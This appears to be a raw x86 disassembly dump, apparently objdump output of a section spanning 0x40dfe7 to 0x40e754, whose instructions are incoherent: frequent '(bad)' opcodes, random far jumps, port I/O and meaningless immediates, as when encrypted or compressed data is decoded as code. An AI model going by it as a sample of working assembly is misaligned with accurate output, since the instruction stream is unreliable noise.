  40dfe7:	mov    eax,ds:0x146a1c24
  40dfec:	sbb    cl,BYTE PTR [ecx]
  40dfee:	inc    eax
  40dfef:	sbb    cl,BYTE PTR [ebp-0x50]
  40dff2:	(bad)  
  40dff3:	ror    DWORD PTR [ecx+edx*2-0x444d9042],1
  40dffa:	dec    eax
  40dffb:	les    ebx,FWORD PTR [eax+0x39]
  40dffe:	(bad)  
  40dfff:	mov    ah,0x5f
  40e001:	icebp  
  40e002:	retf   
  40e003:	xchg   ecx,eax
  40e004:	or     esp,DWORD PTR [ebx]
  40e006:	rcl    BYTE PTR [ecx-0x5fa2bffc],cl
  40e00c:	(bad)  
  40e00e:	das    
  40e00f:	sbb    ecx,ebx
  40e011:	test   BYTE PTR [edi+0x7fe33dea],bl
  40e017:	add    DWORD PTR [ecx],ecx
  40e019:	scas   eax,DWORD PTR es:[edi]
  40e01a:	jg     0x40e03b
  40e01c:	add    BYTE PTR ds:0xaee10faa,cl
  40e022:	lods   al,BYTE PTR ds:[esi]
  40e023:	pop    edi
  40e024:	jg     0x40e022
  40e026:	cmc    
  40e027:	int3   
  40e028:	loope  0x40e039
  40e02a:	mov    WORD PTR [esi-0xf],?
  40e02d:	xchg   edi,eax
  40e02e:	pop    eax
  40e02f:	jmp    0x484b:0x481532c1
  40e036:	xor    esi,edx
  40e038:	lock sub al,BYTE PTR [eax-0x222d756c]
  40e03f:	pop    esi
  40e040:	in     eax,0x14
  40e042:	adc    eax,DWORD PTR [edi+0x40]
  40e045:	jle    0x40e050
  40e047:	cmp    BYTE PTR [eax+0x10],bh
  40e04a:	sbb    esi,ebp
  40e04c:	dec    ebp
  40e04d:	jge    0x40dfda
  40e04f:	mov    esp,0xd7a5181
  40e054:	ins    BYTE PTR es:[edi],dx
  40e055:	xchg   ebp,eax
  40e056:	int3   
  40e057:	lahf   
  40e058:	push   esp
  40e059:	cmp    DWORD PTR [edx+0x675dd92],ecx
  40e05f:	xor    eax,0x509ae42e
  40e064:	int    0x59
  40e066:	aaa    
  40e067:	sti    
  40e068:	dec    esp
  40e069:	mov    dh,0xd5
  40e06b:	xor    bl,BYTE PTR [edx]
  40e06d:	xchg   edi,eax
  40e06e:	scas   eax,DWORD PTR es:[edi]
  40e06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e070:	mov    ecx,0x33c5b1de
  40e075:	stc    
  40e076:	test   DWORD PTR [ebp+eiz*1+0x50c0e290],edx
  40e07d:	add    eax,0x2a63277a
  40e082:	das    
  40e083:	loopne 0x40e01b
  40e085:	ja     0x40e106
  40e087:	fist   DWORD PTR [esi]
  40e089:	push   eax
  40e08a:	push   ecx
  40e08b:	test   BYTE PTR [esi],cl
  40e08d:	pop    ss
  40e08e:	scas   eax,DWORD PTR es:[edi]
  40e08f:	or     al,0x77
  40e091:	ins    BYTE PTR es:[edi],dx
  40e092:	or     edi,DWORD PTR [ebp+0x5a601282]
  40e098:	(bad)  
  40e099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e09a:	mov    eax,0xe110c88f
  40e09f:	popf   
  40e0a0:	adc    BYTE PTR [ebx+0x2ea52590],al
  40e0a6:	stos   BYTE PTR es:[edi],al
  40e0a7:	pop    edx
  40e0a8:	add    bh,BYTE PTR [ebx+0x5ab0a012]
  40e0ae:	mov    ah,0xd0
  40e0b0:	pop    ebx
  40e0b1:	call   0xf0f5:0xce75a992
  40e0b8:	(bad)  
  40e0b9:	mov    DWORD PTR [ebx+eiz*1-0x5cf80f55],edx
  40e0c0:	jb     0x40e0cd
  40e0c2:	xor    ah,BYTE PTR [ecx+0x3e207b33]
  40e0c8:	mov    dl,0xd5
  40e0ca:	mov    al,ds:0xe45c90b6
  40e0cf:	adc    eax,0x4c01aadf
  40e0d4:	xor    BYTE PTR ss:[esi-0xa64c190],bl
  40e0db:	outs   dx,BYTE PTR ds:[esi]
  40e0dc:	mov    bh,0x9e
  40e0de:	push   ebx
  40e0df:	jnp    0x40e0cd
  40e0e1:	sbb    BYTE PTR [ecx],ah
  40e0e3:	jle    0x40e162
  40e0e5:	out    dx,eax
  40e0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0e7:	or     cl,BYTE PTR [edi]
  40e0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ea:	sub    dh,BYTE PTR [ebp-0x45f2236c]
  40e0f0:	inc    ebx
  40e0f1:	adc    dl,BYTE PTR [ecx]
  40e0f3:	adc    bh,al
  40e0f5:	cmp    BYTE PTR [esi+0xc],bl
  40e0f8:	les    edi,FWORD PTR [ebx-0x31]
  40e0fb:	fxch   st(4)
  40e0fd:	ds ss adc ah,cl
  40e101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e102:	sbb    esi,DWORD PTR [ebx]
  40e104:	loopne 0x40e14d
  40e106:	cmc    
  40e107:	sub    edi,ebp
  40e109:	push   es
  40e10a:	cs js  0x40e0d4
  40e10d:	mov    WORD PTR [edx-0x48],?
  40e110:	stos   DWORD PTR es:[edi],eax
  40e111:	mov    edx,0xa079bcb1
  40e116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e117:	cmp    al,0xae
  40e119:	pop    ecx
  40e11a:	sub    DWORD PTR [ebx+0x77732257],esi
  40e120:	mov    bh,0x11
  40e122:	mov    ah,al
  40e124:	mov    DWORD PTR [ebx+esi*4+0x4a],edx
  40e128:	xchg   ebx,eax
  40e129:	icebp  
  40e12a:	push   esp
  40e12b:	fwait
  40e12c:	dec    eax
  40e12d:	scas   al,BYTE PTR es:[edi]
  40e12e:	test   al,0x59
  40e130:	xor    eax,0x94d99805
  40e135:	inc    edx
  40e136:	fisttp QWORD PTR [eax]
  40e138:	scas   eax,DWORD PTR es:[edi]
  40e139:	sbb    BYTE PTR [ecx+0x66],bl
  40e13c:	xor    bl,dl
  40e13e:	pop    eax
  40e13f:	pop    edx
  40e140:	pushf  
  40e141:	retf   
  40e142:	pop    ds
  40e143:	dec    eax
  40e144:	hlt    
  40e145:	(bad)  
  40e146:	js     0x40e1b4
  40e148:	std    
  40e149:	or     eax,0xd5d07d36
  40e14e:	xor    al,0x7f
  40e150:	push   esi
  40e151:	push   edx
  40e152:	push   0xffffffc6
  40e154:	mov    edi,0x55cfd80
  40e159:	sar    BYTE PTR [esp+ebx*8-0x15],cl
  40e15d:	xchg   edi,eax
  40e15e:	add    DWORD PTR [ecx+edi*4-0x3f114eaa],ebx
  40e165:	xchg   ebx,eax
  40e166:	or     BYTE PTR es:[eax-0x68c7fc91],bl
  40e16d:	push   ecx
  40e16e:	pop    edi
  40e16f:	jnp    0x40e169
  40e171:	es inc ebx
  40e173:	je     0x40e17a
  40e175:	jle    0x40e1d6
  40e177:	push   cs
  40e178:	sbb    BYTE PTR [esi+0x5b83bd92],dl
  40e17e:	xchg   edx,eax
  40e17f:	jmp    0x40e1b2
  40e181:	adc    DWORD PTR [esi+0x46200095],edx
  40e187:	not    ebx
  40e189:	icebp  
  40e18a:	scas   eax,DWORD PTR es:[edi]
  40e18b:	ds jge 0x40e1e2
  40e18e:	sbb    al,BYTE PTR [eax-0x3]
  40e191:	and    DWORD PTR [ebx+0x4e],eax
  40e194:	dec    ecx
  40e195:	sahf   
  40e196:	shl    BYTE PTR ds:[ecx],0x70
  40e19a:	cmp    ch,dl
  40e19c:	pop    es
  40e19d:	mov    eax,0x6d9df8a9
  40e1a2:	lea    edx,[eax+0x45]
  40e1a5:	jns    0x40e1c6
  40e1a7:	xor    eax,DWORD PTR [edx+0x366e787e]
  40e1ad:	cwde   
  40e1ae:	pop    esi
  40e1af:	fwait
  40e1b0:	popa   
  40e1b1:	ins    BYTE PTR es:[edi],dx
  40e1b2:	lahf   
  40e1b3:	mov    ebx,0x2177299b
  40e1b8:	mov    ch,0x18
  40e1ba:	mov    eax,0xdaa7b112
  40e1bf:	retf   
  40e1c0:	ror    BYTE PTR [esi+0x3172c46],0xd0
  40e1c7:	inc    ebp
  40e1c8:	in     al,dx
  40e1c9:	xchg   edi,eax
  40e1ca:	mov    dh,ah
  40e1cc:	int    0xd3
  40e1ce:	inc    edx
  40e1cf:	mov    al,0xfc
  40e1d1:	into   
  40e1d2:	push   ds
  40e1d3:	jns    0x40e1a8
  40e1d5:	stc    
  40e1d6:	es retf 0xa1a7
  40e1da:	jne    0x40e17a
  40e1dc:	ja     0x40e22f
  40e1de:	fnstcw WORD PTR [ecx+0x22]
  40e1e1:	ret    0xb6d0
  40e1e4:	dec    esp
  40e1e5:	cmp    al,0xff
  40e1e7:	pop    edx
  40e1e8:	mov    dl,0xa0
  40e1ea:	jb     0x40e267
  40e1ec:	mov    dl,0xa9
  40e1ee:	mov    eax,ds:0x84d307f2
  40e1f3:	not    DWORD PTR [ebx+0x5b009a92]
  40e1f9:	jp     0x40e191
  40e1fb:	pop    edx
  40e1fc:	mov    dh,0x44
  40e1fe:	adc    esi,DWORD PTR [ebx-0x5]
  40e201:	ror    edi,cl
  40e203:	xchg   esi,eax
  40e204:	stos   BYTE PTR es:[edi],al
  40e205:	push   ebx
  40e206:	add    esi,esp
  40e208:	jmp    0x5ac5fdb2
  40e20d:	jg     0x40e27d
  40e20f:	ins    DWORD PTR es:[edi],dx
  40e210:	aam    0xe5
  40e212:	cmp    al,0x64
  40e214:	retf   0xd68d
  40e217:	fcos   
  40e219:	es ret 0x569b
  40e21d:	or     eax,0x58f94524
  40e222:	fstp   DWORD PTR [ebx-0x355a2697]
  40e228:	stos   BYTE PTR es:[edi],al
  40e229:	mov    al,0x5e
  40e22b:	jl     0x40e23b
  40e22d:	ds push cs
  40e22f:	jnp    0x40e1bc
  40e231:	add    al,0xa1
  40e233:	mov    ?,WORD PTR [ebp-0x75846117]
  40e239:	stos   BYTE PTR es:[edi],al
  40e23a:	js     0x40e1d4
  40e23c:	adc    DWORD PTR ds:0x8dd92feb,0xd33cec4e
  40e246:	ret    0xc041
  40e249:	scas   al,BYTE PTR es:[edi]
  40e24a:	out    0x4b,al
  40e24c:	or     al,0xa9
  40e24e:	sbb    cl,BYTE PTR [eax+0x29138070]
  40e254:	dec    edx
  40e255:	fwait
  40e256:	jb     0x40e2ca
  40e258:	in     eax,dx
  40e259:	in     al,0xa0
  40e25b:	sbb    esp,DWORD PTR ds:0x8d68e3c1
  40e261:	sub    al,0x7a
  40e263:	pop    ebp
  40e264:	lds    ebp,FWORD PTR [ebx+0x2]
  40e267:	enter  0x810e,0xf5
  40e26b:	sub    ebx,DWORD PTR [eax]
  40e26d:	mov    eax,ds:0x9573267d
  40e272:	push   ebx
  40e273:	and    DWORD PTR [eax+0x31],edx
  40e276:	jb     0x40e2bc
  40e278:	nop
  40e279:	(bad)  
  40e27a:	or     al,0x68
  40e27c:	mov    edi,0xf394374b
  40e281:	push   esi
  40e282:	stos   BYTE PTR es:[edi],al
  40e283:	mov    dl,0xf1
  40e285:	ss dec ebp
  40e287:	jl     0x40e27f
  40e289:	push   ds
  40e28a:	and    dl,dl
  40e28c:	sbb    al,0x37
  40e28e:	sub    al,0xf1
  40e290:	fmul   DWORD PTR [esi-0x32]
  40e293:	ficomp WORD PTR [ecx]
  40e295:	ja     0x40e2df
  40e297:	repnz or DWORD PTR [edi],ebx
  40e29a:	inc    esi
  40e29b:	or     edi,DWORD PTR [ebx]
  40e29d:	adc    ah,bh
  40e29f:	jge    0x40e2eb
  40e2a1:	or     al,0x15
  40e2a3:	mov    esi,0x1bef09d4
  40e2a8:	in     eax,0x76
  40e2aa:	sub    eax,0x71b13895
  40e2af:	sbb    cl,ch
  40e2b1:	sahf   
  40e2b2:	jae    0x40e294
  40e2b4:	jne    0x40e2e6
  40e2b6:	sbb    edx,0x7d
  40e2b9:	push   cs
  40e2ba:	daa    
  40e2bb:	lock lods eax,DWORD PTR ds:[esi]
  40e2bd:	shl    DWORD PTR ds:0xb35f896f,1
  40e2c3:	xor    BYTE PTR [edx],bl
  40e2c5:	cld    
  40e2c6:	gs ds test ah,al
  40e2ca:	or     eax,0x842bb80e
  40e2d0:	mov    ebp,0x148c8bc9
  40e2d5:	mov    bl,0xa8
  40e2d7:	add    al,bl
  40e2d9:	lahf   
  40e2da:	fild   WORD PTR [eax]
  40e2dc:	in     eax,dx
  40e2dd:	(bad)  
  40e2de:	fsubr  DWORD PTR [eax+0x11651239]
  40e2e4:	jmp    0x6918:0x6c4625ff
  40e2eb:	adc    eax,0x496d8ec4
  40e2f0:	aad    0x7c
  40e2f2:	clc    
  40e2f3:	(bad)  
  40e2f4:	adc    eax,0x7c3c379b
  40e2f9:	mov    WORD PTR [ebx+eiz*1],?
  40e2fc:	outs   dx,BYTE PTR ds:[esi]
  40e2fd:	mov    bh,0xd2
  40e2ff:	in     eax,dx
  40e300:	mov    ah,0x18
  40e302:	push   ebx
  40e303:	(bad)  
  40e304:	sub    ebx,DWORD PTR [edx+0x78]
  40e307:	inc    esp
  40e308:	xor    BYTE PTR ds:0x1d5b615d,bl
  40e30e:	pop    ss
  40e30f:	ret    
  40e310:	inc    ebp
  40e311:	jecxz  0x40e2a6
  40e313:	jecxz  0x40e30b
  40e315:	xchg   ecx,eax
  40e316:	jle    0x40e2e7
  40e318:	push   0xed3d9fbd
  40e31d:	cmp    ah,0xd5
  40e320:	jo     0x40e2f0
  40e322:	push   ebp
  40e323:	aaa    
  40e324:	sahf   
  40e325:	(bad)  
  40e326:	jns    0x40e378
  40e328:	sar    BYTE PTR es:[edi-0x38],cl
  40e32c:	nop
  40e32d:	sahf   
  40e32e:	or     al,BYTE PTR [edx+ebp*8-0x20da91]
  40e335:	shl    bl,cl
  40e337:	bound  edi,QWORD PTR [ecx]
  40e339:	mov    ds:0xfe8bfe7e,eax
  40e33e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33f:	inc    ecx
  40e340:	and    edi,DWORD PTR [ecx-0x7b]
  40e343:	xchg   esp,eax
  40e344:	inc    esi
  40e345:	out    0x25,eax
  40e347:	nop
  40e348:	xor    bl,BYTE PTR [ebp+0xddc0fc5]
  40e34e:	mov    esp,0x1cc1eacb
  40e353:	in     eax,0x52
  40e355:	fwait
  40e356:	cmp    ebx,esi
  40e358:	cwde   
  40e359:	push   ebx
  40e35a:	in     al,dx
  40e35b:	sub    DWORD PTR [edi-0x4a],0xffffff82
  40e35f:	add    DWORD PTR [eax+0x45d3bc7c],edi
  40e365:	ds and al,0xc3
  40e368:	(bad)  
  40e369:	stos   BYTE PTR es:[edi],al
  40e36a:	adc    eax,0x6c24bf12
  40e36f:	jg     0x40e38e
  40e371:	dec    ebp
  40e372:	pop    ebx
  40e373:	add    esp,ecx
  40e375:	cmp    al,BYTE PTR [ecx+edi*2-0x522b555c]
  40e37c:	clc    
  40e37d:	aad    0xdd
  40e37f:	shl    BYTE PTR [ebp+0x35281ee1],1
  40e385:	test   eax,0x1142d38f
  40e38a:	pop    ebp
  40e38b:	mov    cl,cl
  40e38d:	adc    BYTE PTR [esi-0x1c],ch
  40e390:	cmp    eax,0x505b8b35
  40e395:	aam    0xca
  40e397:	mov    cl,0xde
  40e399:	cld    
  40e39a:	sub    eax,0xa37ee4ae
  40e39f:	outs   dx,BYTE PTR ds:[esi]
  40e3a0:	fisttp WORD PTR [ebx-0x1]
  40e3a3:	jne    0x40e418
  40e3a5:	mov    ecx,0xf41ac12c
  40e3aa:	outs   dx,BYTE PTR ds:[esi]
  40e3ab:	xor    BYTE PTR [edi+0x5d325de7],bh
  40e3b1:	push   ebp
  40e3b2:	inc    edx
  40e3b3:	cdq    
  40e3b4:	sbb    eax,0x590000e6
  40e3b9:	xabort 0x57
  40e3bc:	ret    
  40e3bd:	popf   
  40e3be:	xlat   BYTE PTR ds:[ebx]
  40e3bf:	mov    ecx,0x35c75c4a
  40e3c4:	mov    ecx,ebp
  40e3c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3c7:	out    dx,al
  40e3c8:	cmp    cl,dh
  40e3ca:	pop    eax
  40e3cb:	(bad)  
  40e3cc:	push   ds
  40e3cd:	lea    ebx,[edi+edi*2+0x4d2486a4]
  40e3d4:	outs   dx,DWORD PTR ds:[esi]
  40e3d5:	lea    eax,[esi-0x2]
  40e3d8:	in     al,dx
  40e3d9:	mov    cl,ch
  40e3db:	adc    eax,0xb386a5a9
  40e3e0:	out    dx,eax
  40e3e1:	sub    BYTE PTR [edi-0x755bbfd4],ah
  40e3e7:	jmp    0x40e409
  40e3e9:	(bad)  
  40e3ea:	fild   DWORD PTR [edi-0x43]
  40e3ed:	rep ins DWORD PTR es:[edi],dx
  40e3ef:	or     al,ah
  40e3f1:	(bad)  
  40e3f2:	pop    ds
  40e3f3:	icebp  
  40e3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3f5:	mov    al,ds:0xbaf0f3e7
  40e3fa:	fisubr WORD PTR [esi+0x53fba5d7]
  40e400:	(bad)  
  40e401:	mov    ebx,0x6136e985
  40e406:	aaa    
  40e407:	shl    ebp,cl
  40e409:	xlat   BYTE PTR ds:[ebx]
  40e40a:	xchg   esi,eax
  40e40b:	mov    bh,0xda
  40e40d:	inc    edx
  40e40e:	int    0x60
  40e410:	jmp    0x1623:0x3a6cc9c7
  40e417:	in     al,dx
  40e418:	scas   eax,DWORD PTR es:[edi]
  40e419:	iret   
  40e41a:	sar    BYTE PTR [ebx-0x66],cl
  40e41d:	loop   0x40e44d
  40e41f:	imul   si,WORD PTR [ecx+ebp*2-0x69],0x9d3d
  40e426:	adc    bh,0xc1
  40e429:	arpl   WORD PTR [edi+edi*4-0x75],di
  40e42d:	mov    bl,0xf5
  40e42f:	test   BYTE PTR [ebp+ecx*1-0x1437e10],ah
  40e436:	test   eax,0xca914e27
  40e43b:	mov    ds:0x104128df,eax
  40e440:	push   edx
  40e441:	push   0x78
  40e443:	aas    
  40e444:	je     0x40e3ea
  40e446:	je     0x40e454
  40e448:	imul   esi,DWORD PTR [edi+0x6f],0x1c
  40e44c:	jbe    0x40e49b
  40e44e:	mov    al,ds:0xe1ac4e41
  40e453:	xchg   ecx,eax
  40e454:	bt     DWORD PTR [ecx+0x533e5b0a],ebx
  40e45b:	mov    bl,0xa8
  40e45d:	or     al,0x18
  40e45f:	arpl   WORD PTR [esi],dx
  40e461:	inc    esi
  40e462:	inc    ebx
  40e463:	mov    edx,0x9d7f21c3
  40e468:	jg     0x40e4ac
  40e46a:	sti    
  40e46b:	mov    cl,0x9e
  40e46d:	fadd   DWORD PTR [esi]
  40e46f:	hlt    
  40e470:	jmp    0xb4ed:0xf8f69714
  40e477:	xchg   edx,eax
  40e478:	and    cl,BYTE PTR [ecx-0x259e0fac]
  40e47e:	je     0x40e4cf
  40e480:	adc    ah,al
  40e482:	jl     0x40e420
  40e484:	hlt    
  40e485:	dec    eax
  40e486:	xchg   ebp,eax
  40e487:	jmp    0x2e74:0x8b826371
  40e48e:	sbb    al,0x50
  40e490:	adc    ah,0xe1
  40e493:	jge    0x40e4e6
  40e495:	addr16 cli 
  40e497:	jb     0x40e42f
  40e499:	jmp    0x40e4c8
  40e49b:	mov    edx,0x7db45b5f
  40e4a0:	jmp    0x24ee:0x38ddc2c1
  40e4a7:	into   
  40e4a8:	jb     0x40e4b7
  40e4aa:	push   0x3c
  40e4ac:	cmp    esp,DWORD PTR [ebx-0x47]
  40e4af:	test   dh,ch
  40e4b1:	jge    0x40e4f7
  40e4b3:	push   edx
  40e4b4:	mov    ch,0x8a
  40e4b6:	lods   al,BYTE PTR ds:[esi]
  40e4b7:	and    DWORD PTR [ebp+0x74],edx
  40e4ba:	or     BYTE PTR ds:0xd3a5ef1c,al
  40e4c0:	mov    gs:0xa2939071,al
  40e4c6:	out    dx,eax
  40e4c7:	std    
  40e4c8:	jmp    0x40e546
  40e4ca:	adc    dh,ch
  40e4cc:	rcl    BYTE PTR [edx-0x4350191a],1
  40e4d2:	lods   eax,DWORD PTR ds:[esi]
  40e4d3:	and    DWORD PTR [ebx-0x3906686f],eax
  40e4d9:	(bad)
  40e4dc:	ins    BYTE PTR es:[edi],dx
  40e4dd:	in     eax,0x38
  40e4df:	adc    DWORD PTR [eax],0xffffffa7
  40e4e2:	lock add bx,WORD PTR [esp+edi*2+0x6f]
  40e4e8:	retf   0x2e42
  40e4eb:	sbb    al,BYTE PTR ds:0x3fa3b713
  40e4f1:	push   0x79
  40e4f3:	or     eax,0xe656e9cd
  40e4f8:	or     cl,BYTE PTR [eax]
  40e4fa:	inc    ebx
  40e4fb:	pxor   mm0,QWORD PTR [eax-0x7f93a4c]
  40e502:	(bad)  
  40e503:	in     eax,0xeb
  40e505:	in     eax,dx
  40e506:	adc    dh,bh
  40e508:	mov    bl,0xf0
  40e50a:	adc    bl,BYTE PTR [edx]
  40e50c:	daa    
  40e50d:	inc    edx
  40e50e:	popf   
  40e50f:	fs aam 0x2b
  40e512:	mov    ebx,ebx
  40e514:	and    ebx,ebp
  40e516:	clc    
  40e517:	xor    eax,0x42a7dae0
  40e51c:	mov    ecx,DWORD PTR [ecx+0x60]
  40e51f:	cmp    eax,0x724df493
  40e524:	mov    ebx,0xbfbcb2ed
  40e529:	xor    bl,BYTE PTR [esi+0x4c0c3b43]
  40e52f:	xchg   esi,edi
  40e531:	in     eax,0x62
  40e533:	sar    DWORD PTR [edx-0x55afb77d],cl
  40e539:	lea    edi,[ecx+0x4a38e9b7]
  40e53f:	add    DWORD PTR [ebx+0xa],edi
  40e542:	pushf  
  40e543:	je     0x40e52b
  40e545:	mov    ss,WORD PTR [edi]
  40e547:	adc    al,0xc2
  40e549:	fnsave ds:0x6a13cb5c
  40e54f:	leave  
  40e550:	fistp  WORD PTR gs:[eax-0x56]
  40e554:	jno    0x40e5af
  40e556:	fbstp  TBYTE PTR [eax+0x66]
  40e559:	(bad)  
  40e55a:	push   cs
  40e55b:	mov    bh,0x72
  40e55d:	dec    ebp
  40e55e:	in     eax,0xc0
  40e560:	cmc    
  40e561:	fisttp WORD PTR [ecx+0x1e]
  40e564:	scas   eax,DWORD PTR es:[edi]
  40e565:	pop    eax
  40e566:	ret    
  40e567:	out    dx,eax
  40e568:	les    ebp,FWORD PTR [edx+esi*8]
  40e56b:	pop    es
  40e56c:	call   0x27cbae38
  40e571:	ret    
  40e572:	outs   dx,DWORD PTR ds:[esi]
  40e573:	xchg   DWORD PTR [ebx-0x615329c8],ebx
  40e579:	xor    al,0x1b
  40e57b:	dec    esi
  40e57c:	inc    edi
  40e57d:	push   edi
  40e57e:	sahf   
  40e57f:	stos   DWORD PTR es:[edi],eax
  40e580:	(bad)  
  40e581:	leave  
  40e582:	loopne 0x40e5f2
  40e584:	lahf   
  40e585:	jnp    0x40e546
  40e587:	shl    BYTE PTR [ecx],1
  40e589:	mov    ecx,0xc477a623
  40e58e:	sub    cl,BYTE PTR [eax+0x23b11c90]
  40e594:	inc    ebx
  40e595:	outs   dx,BYTE PTR ds:[esi]
  40e596:	fisttp WORD PTR [eax]
  40e598:	rcl    ch,0xfd
  40e59b:	add    ah,BYTE PTR [eax]
  40e59d:	imul   eax,eax,0xa
  40e5a0:	sbb    ah,BYTE PTR [ecx+edi*8]
  40e5a3:	jl     0x40e5dc
  40e5a5:	mov    bh,0x88
  40e5a7:	jle    0x40e540
  40e5a9:	xor    ch,BYTE PTR [edi+ecx*8-0x266f9d6a]
  40e5b0:	sub    ebp,DWORD PTR [edx]
  40e5b2:	retf   
  40e5b3:	dec    edx
  40e5b4:	test   eax,0x5cce655a
  40e5b9:	lahf   
  40e5ba:	setns  BYTE PTR [ecx+edi*8+0x300f465b]
  40e5c2:	mov    eax,0x916641d3
  40e5c7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40e5c9:	scas   eax,DWORD PTR es:[edi]
  40e5ca:	fldcw  WORD PTR [esi+0x7361ee2a]
  40e5d0:	sbb    al,0x9f
  40e5d2:	and    eax,0xb2120431
  40e5d7:	or     bh,BYTE PTR [edi+0x75]
  40e5da:	aas    
  40e5db:	mov    ds:0x15f929c6,eax
  40e5e0:	mov    ebp,0x86838ea9
  40e5e5:	out    0x1b,eax
  40e5e7:	add    al,BYTE PTR [edi]
  40e5e9:	adc    eax,0xd0a4b004
  40e5ee:	inc    esi
  40e5ef:	gs retfw 
  40e5f2:	mov    ecx,?
  40e5f4:	lea    edx,[edx]
  40e5f6:	add    bh,ah
  40e5f8:	aaa    
  40e5f9:	sbb    DWORD PTR [ebx],esp
  40e5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5fc:	loop   0x40e634
  40e5fe:	jae    0x40e61e
  40e600:	pop    edi
  40e601:	int3   
  40e602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e603:	test   BYTE PTR [edx+0x26],dh
  40e606:	loope  0x40e5d8
  40e608:	and    DWORD PTR [edi-0xf7a1727],esi
  40e60e:	out    0xf6,al
  40e610:	out    0xc9,al
  40e612:	in     eax,0x11
  40e614:	fadd   DWORD PTR [edx-0x3f]
  40e617:	adc    esp,DWORD PTR [edi]
  40e619:	inc    ebp
  40e61a:	test   DWORD PTR [esi+0x4e567ec9],edx
  40e620:	(bad)  
  40e621:	loopne 0x40e646
  40e623:	sub    bh,bh
  40e625:	cmp    eax,edx
  40e627:	lock xor eax,0xe2681dea
  40e62d:	fdivr  st,st(7)
  40e62f:	loopne 0x40e5e6
  40e631:	jp     0x40e68e
  40e633:	aaa    
  40e634:	jmp    0xa831:0x84e5e662
  40e63b:	cmp    al,0xc5
  40e63d:	imul   edx,DWORD PTR [ecx],0x5bb405f3
  40e643:	mov    ch,0x31
  40e645:	lea    esp,[ebx]
  40e647:	jb     0x40e617
  40e649:	(bad)  
  40e64a:	adc    eax,0xa27f43ad
  40e64f:	add    DWORD PTR [ebx+ecx*1],esi
  40e652:	imul   ebp,DWORD PTR [esi+0x5e],0x3a1bc230
  40e659:	push   eax
  40e65a:	pushf  
  40e65b:	cmp    al,0xc3
  40e65d:	sahf   
  40e65e:	adc    eax,0x2e77f21f
  40e663:	stos   BYTE PTR es:[edi],al
  40e664:	test   BYTE PTR [ebx-0x1bcb4695],0x6e
  40e66b:	push   ebx
  40e66c:	je     0x40e65f
  40e66e:	out    dx,al
  40e66f:	pop    edi
  40e670:	or     BYTE PTR [edi],ah
  40e672:	inc    ebx
  40e673:	in     eax,0xda
  40e675:	mov    eax,0x810600e6
  40e67a:	xchg   ecx,eax
  40e67b:	(bad)  
  40e67c:	ss push esi
  40e67e:	cmp    DWORD PTR [edx+0x3e298363],0x6c
  40e685:	inc    eax
  40e686:	xchg   esi,eax
  40e687:	xchg   ebx,eax
  40e688:	ins    DWORD PTR es:[edi],dx
  40e689:	ss cdq 
  40e68b:	mov    ds:0xd7626ec8,eax
  40e690:	test   BYTE PTR [eax+0x6da3eb5f],al
  40e696:	test   esp,ebp
  40e698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e699:	xchg   edx,eax
  40e69a:	mov    cl,0x75
  40e69c:	in     al,dx
  40e69d:	inc    edi
  40e69e:	sbb    bl,BYTE PTR [edi-0x6f3d6e1d]
  40e6a4:	lea    edi,[ebx-0x5bd0bec5]
  40e6aa:	cmp    al,dl
  40e6ac:	pop    ds
  40e6ad:	push   cs
  40e6ae:	xor    bl,bh
  40e6b0:	(bad)  
  40e6b1:	xor    DWORD PTR [esi],edi
  40e6b3:	psrlw  mm3,QWORD PTR es:[edx+eax*1-0x299121dc]
  40e6bc:	lahf   
  40e6bd:	adc    BYTE PTR [ecx],ah
  40e6bf:	sar    DWORD PTR [esi],cl
  40e6c1:	cmp    DWORD PTR [edi+ebp*1+0x1c083072],0xffffffb2
  40e6c9:	mov    ds:0xff3c7423,eax
  40e6ce:	mov    ds:0x1f1d1dc3,eax
  40e6d3:	push   esi
  40e6d4:	(bad)  
  40e6d5:	cmp    BYTE PTR [ebx+0x18],al
  40e6d8:	pop    edx
  40e6d9:	es sub esi,ebx
  40e6dc:	dec    ebx
  40e6dd:	rcr    DWORD PTR [edx+0x62fc099d],1
  40e6e3:	jge    0x40e749
  40e6e5:	stc    
  40e6e6:	xlat   BYTE PTR ds:[ebx]
  40e6e7:	xchg   edi,eax
  40e6e8:	ds std 
  40e6ea:	mov    al,ds:0xafc8820f
  40e6ef:	push   0x29429b92
  40e6f4:	sub    edx,DWORD PTR [esi]
  40e6f6:	or     bh,al
  40e6f8:	repnz add al,bl
  40e6fb:	or     al,0x40
  40e6fd:	(bad)  
  40e6fe:	pop    ebp
  40e6ff:	shl    BYTE PTR [edx-0x35],1
  40e702:	adc    DWORD PTR [esi+edi*2],esp
  40e705:	jne    0x40e723
  40e707:	and    esp,edx
  40e709:	cli    
  40e70a:	jecxz  0x40e74d
  40e70c:	mov    dl,bh
  40e70e:	mov    ebp,0x854141e5
  40e713:	mov    dl,0xe3
  40e715:	mov    ebx,0x52b810f4
  40e71a:	xor    al,0xac
  40e71c:	(bad)  
  40e71d:	or     ebx,esi
  40e71f:	add    BYTE PTR [esi-0x1b],dh
  40e722:	fdiv   DWORD PTR [edx]
  40e724:	lea    edi,[esi-0x77]
  40e727:	push   ecx
  40e728:	or     al,0xbf
  40e72a:	jo     0x40e734
  40e72c:	push   0xa6ea8cd2
  40e731:	int3   
  40e732:	xchg   cl,cl
  40e734:	shl    bl,cl
  40e736:	aaa    
  40e737:	or     dh,dh
  40e739:	int    0x2f
  40e73b:	cmp    ebx,ebx
  40e73d:	sub    eax,0xb6f1c4c4
  40e742:	(bad)  
  40e743:	or     eax,0xc8b290ec
  40e748:	jno    0x40e795
  40e74a:	sbb    BYTE PTR [ecx-0x2924fe89],al
  40e750:	pop    ds
  40e751:	mov    dh,0xf2
  40e753:	das    
  40e754:	jns    0x40e7be
